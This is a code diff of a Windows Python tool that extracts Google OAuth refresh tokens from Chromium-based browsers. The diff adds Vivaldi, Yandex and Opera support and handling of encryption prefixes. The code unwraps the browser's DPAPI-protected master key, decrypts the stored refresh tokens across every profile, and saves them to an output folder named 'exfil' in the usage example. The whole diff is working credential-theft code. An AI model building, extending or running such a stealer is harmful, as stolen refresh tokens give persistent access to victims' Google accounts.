@@ -2,14 +2,15 @@
 """
 Google OAuth Token Extractor — Windows Desktop
 
-Extracts 1//... Google OAuth refresh tokens from Chrome/Edge/Brave
-on a Windows machine. Requires running as the logged-in user.
+Extracts 1//... Google OAuth refresh tokens from Chromium-based browsers
+(Chrome, Edge, Brave, Vivaldi, Yandex, Opera) on a Windows machine.
+Requires running as the logged-in user.
 
 Usage:
     python extract_tokens_windows.py                    # Chrome only
-    python extract_tokens_windows.py --all-browsers      # Chrome + Edge + Brave
+    python extract_tokens_windows.py --all-browsers      # Every supported browser
     python extract_tokens_windows.py --output C:/exfil   # Custom output dir
-    python extract_tokens_windows.py --browser chrome    # Single browser
+    python extract_tokens_windows.py --browser yandex    # Single browser
 
 Dependencies (Windows only):
     pip install -r requirements.txt
@@ -67,47 +68,135 @@ BROWSER_PATHS = {
         "local_state": "Local State",
         "web_data": "Web Data",
     },
+    "vivaldi": {
+        "name": "Vivaldi",
+        "user_data": os.environ.get("LOCALAPPDATA", "") + "\\Vivaldi\\User Data",
+        "local_state": "Local State",
+        "web_data": "Web Data",
+    },
+    "yandex": {
+        "name": "Yandex Browser",
+        "user_data": os.environ.get("LOCALAPPDATA", "")
+            + "\\Yandex\\YandexBrowser\\User Data",
+        "local_state": "Local State",
+        "web_data": "Web Data",
+    },
+    "opera": {
+        "name": "Opera",
+        # Opera is the odd one out: its profile lives under %APPDATA%
+        # (Roaming), not %LOCALAPPDATA%, and is stored directly in the
+        # "Opera Stable" folder rather than a Default/ subdirectory.
+        "user_data": os.environ.get("APPDATA", "")
+            + "\\Opera Software\\Opera Stable",
+        "local_state": "Local State",
+        "web_data": "Web Data",
+    },
 }
 
-# Profile directories to scan (Chrome naming convention)
-PROFILE_DIRS = ["Default"] + [f"Profile {i}" for i in range(1, 100)]
+# Profile directories to scan. Most Chromium browsers keep profiles in
+# subdirectories (Default, Profile 1, ...), but Opera keeps its primary
+# profile in the user_data root, so "" (the root itself) is scanned too.
+# A directory that does not exist is skipped, so the extra entry is free.
+PROFILE_DIRS = [""] + ["Default"] + [f"Profile {i}" for i in range(1, 100)]
+
+
+# --- Cryptography ---
+
+# Chromium OSCrypt value prefixes. Not every table stores the prefix (some
+# token_service rows hold a bare blob), so decrypt_token() only strips it on
+# an exact match.
+CRYPT_PREFIX_DPAPI = b"v10"      # AES-256-GCM, key DPAPI-wrapped in Local State
+CRYPT_PREFIX_CLEAR_KEY = b"v11"  # AES-256-GCM, master key not DPAPI-wrapped
+CRYPT_PREFIX_APP_BOUND = b"v20"  # App-Bound Encryption (Chrome 127+): unsupported
+
+
+class AppBoundEncryptionError(RuntimeError):
+    """
+    Raised for values protected by Chromium App-Bound Encryption (v20).
+
+    App-Bound Encryption (Chrome 127+, July 2024) wraps the AES key an extra
+    time with a key bound to both the machine and the requesting application's
+    identity. It is only unwrappable through the browser's privileged elevation
+    service, so running this extractor as the logged-in user is NOT enough.
+
+    Reported as a distinct error so the failure reads as "ABE, unsupported"
+    rather than a misleading "MAC check failed" / "corrupt Web Data".
+    """
+
+
+# --- Helpers ---
 
 
 # --- Helpers ---
 
 def get_master_key(local_state_path):
-    """Read and decrypt Chrome's DPAPI-wrapped master encryption key."""
+    """
+    Read Chrome's master encryption key from Local State.
+
+    Returns (master_key, abe_present):
+
+      master_key  -- 32-byte AES key unwrapped via DPAPI, or None when absent
+      abe_present -- True when Local State also carries an
+                     `os_crypt.app_bound_encrypted_key` (Chrome 127+). This is
+                     only a warning: v10 values still use the classic DPAPI
+                     key, while v20 values need the elevation service.
+    """
     if not local_state_path.exists():
-        return None
+        return None, False
 
     with open(local_state_path, "r", encoding="utf-8") as f:
         state = json.load(f)
 
-    encrypted_key_b64 = state.get("os_crypt", {}).get("encrypted_key")
+    os_crypt = state.get("os_crypt", {})
+    abe_present = bool(os_crypt.get("app_bound_encrypted_key"))
+
+    encrypted_key_b64 = os_crypt.get("encrypted_key")
     if not encrypted_key_b64:
-        return None
+        return None, abe_present
 
     # Base64 decode, strip 5-byte 'DPAPI' prefix
     encrypted_key = base64.b64decode(encrypted_key_b64)
-    assert encrypted_key[:5] == b"DPAPI", "Expected DPAPI prefix on encrypted key"
+    if encrypted_key[:5] != b"DPAPI":
+        raise ValueError(
+            "encrypted_key does not start with the 'DPAPI' prefix "
+            f"(got {encrypted_key[:5]!r}) - wrong or corrupt Local State"
+        )
 
     # Decrypt with Windows DPAPI (logged-in user context)
     master_key = win32crypt.CryptUnprotectData(
         encrypted_key[5:], None, None, None, 0
     )[1]
 
-    return master_key
+    return master_key, abe_present
 
 
 def decrypt_token(ciphertext, master_key):
     """
     Decrypt an AES-256-GCM encrypted token using Chrome's master key.
 
-    Chrome format: [12-byte nonce][ciphertext][16-byte GCM tag]
+    Chrome format: [optional vXX][12-byte nonce][ciphertext][16-byte GCM tag]
+
+    The 3-byte prefix is present on values produced by OSCrypt::EncryptString
+    (v10/v11) but absent on some token_service rows, so it is stripped only on
+    an exact match. A v20 prefix means App-Bound Encryption, which this toolkit
+    cannot unwrap; that raises AppBoundEncryptionError.
     """
-    nonce = ciphertext[:12]
-    tag = ciphertext[-16:]
-    ct = ciphertext[12:-16]
+    blob = bytes(ciphertext)
+    prefix = blob[:3]
+
+    if prefix == CRYPT_PREFIX_APP_BOUND:
+        raise AppBoundEncryptionError(
+            "value carries the v20 (App-Bound Encryption) prefix"
+        )
+    if prefix in (CRYPT_PREFIX_DPAPI, CRYPT_PREFIX_CLEAR_KEY):
+        blob = blob[3:]
+
+    if len(blob) < 12 + 16:
+        raise ValueError(f"value too short for AES-256-GCM ({len(blob)} bytes)")
+
+    nonce = blob[:12]
+    tag = blob[-16:]
+    ct = blob[12:-16]
 
     cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
     plaintext = cipher.decrypt_and_verify(ct, tag)
@@ -157,20 +246,34 @@ def extract_browser(browser_key, output_dir):
 
     print(f"\n  [{browser['name']}]")
 
-    master_key = get_master_key(local_state)
+    master_key, abe_present = get_master_key(local_state)
+
+    if abe_present:
+        print("    [!] App-Bound Encryption present (os_crypt.app_bound_encrypted_key)")
+        print("        v10 values still decrypt with the classic key; any v20")
+        print("        value will be skipped - it needs the elevation service.")
+
     if master_key is None:
-        print(f"    [!] No master key found in {local_state}")
+        if abe_present:
+            print(f"    [!] No classic key in {local_state} - profile looks")
+            print("        App-Bound-Encryption-only, which this toolkit cannot")
+            print("        unwrap (needs the browser's elevation service).")
+        else:
+            print(f"    [!] No master key found in {local_state}")
         return []
     print(f"    [+] Master key: {master_key.hex()[:16]}... ({len(master_key)} bytes)")
 
     extracted = []
+    abe_skipped = 0
 
     for profile_dir in PROFILE_DIRS:
-        web_data_path = user_data / profile_dir / browser["web_data"]
+        # "" selects the user_data root itself (Opera's primary profile).
+        profile_path = user_data / profile_dir if profile_dir else user_data
+        web_data_path = profile_path / browser["web_data"]
         if not web_data_path.exists():
             continue
 
-        profile = get_profile_name(user_data / profile_dir)
+        profile = get_profile_name(profile_path)
         print(f"    [~] Scanning {profile}...", end=" ")
 
         # Copy Web Data to avoid SQLite lock issues
@@ -225,6 +328,9 @@ def extract_browser(browser_key, output_dir):
                         print(f"      [+] Gaia {gaia_id}: OK ({token[:30]}...)")
                     else:
                         print(f"      [!] Gaia {gaia_id}: unexpected format (starts {token[:10]}...)")
+                except AppBoundEncryptionError:
+                    abe_skipped += 1
+                    print(f"      [!] Gaia {gaia_id}: App-Bound Encrypted (v20) - skipped")
                 except Exception as e:
                     print(f"      [!] Gaia {gaia_id}: decrypt failed - {e}")
 
@@ -235,6 +341,10 @@ def extract_browser(browser_key, output_dir):
         finally:
             if os.path.exists(tmp_path):
                 os.remove(tmp_path)
+
+    if abe_skipped:
+        print(f"    [!] {abe_skipped} token(s) were App-Bound Encrypted (v20) and")
+        print("        could not be decrypted - see docs/TOKEN_EXTRACTION_WINDOWS.md")
 
     if not extracted:
         print(f"    [-] No valid 1// tokens found")
@@ -251,10 +361,10 @@ def main():
     )
     parser.add_argument(
         "--all-browsers", action="store_true",
-        help="Scan Chrome, Edge, and Brave"
+        help="Scan every supported browser"
     )
     parser.add_argument(
-        "--browser", choices=["chrome", "edge", "brave"], default="chrome",
+        "--browser", choices=sorted(BROWSER_PATHS), default="chrome",
         help="Which browser to scan (default: chrome)"
     )
     parser.add_argument(
